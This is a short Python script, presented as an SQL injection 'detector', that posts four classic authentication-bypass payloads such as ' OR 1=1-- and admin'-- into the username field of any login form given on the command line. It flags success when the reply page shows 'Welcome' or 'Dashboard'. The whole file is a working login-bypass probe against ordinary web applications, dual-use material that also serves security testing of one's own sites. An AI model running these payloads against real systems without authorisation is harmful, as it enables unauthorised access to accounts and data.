import requests
import sys

def sql_injection_detector(url, username_field, password_field):
    """
    Tests a login form for basic SQL injection.

    Args:
        url (str): The URL of the login form.
        username_field (str): The name of the username input field.
        password_field (str): The name of the password input field.
    """
    print(f"[*] Testing {url} for SQL injection...")
    
    payloads = [
        "' OR 1=1--",
        "' OR '1'='1'--",
        "admin'--",
        "' OR '1'='1"
    ]
    
    for payload in payloads:
        data = {
            username_field: payload,
            password_field: "anypassword"
        }
        
        try:
            response = requests.post(url, data=data)
            
            # Check for common keywords that indicate a successful bypass
            if "Welcome" in response.text or "Dashboard" in response.text:
                print(f"[+] Possible SQL injection vulnerability found with payload: {payload}")
                return
        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred: {e}")
            return
            
    print("[*] No simple SQL injection vulnerabilities found.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python sql_detector.py <url> <username_field_name> <password_field_name>")
        sys.exit(1)
        
    target_url = sys.argv[1]
    user_field = sys.argv[2]
    pass_field = sys.argv[3]
    sql_injection_detector(target_url, user_field, pass_field)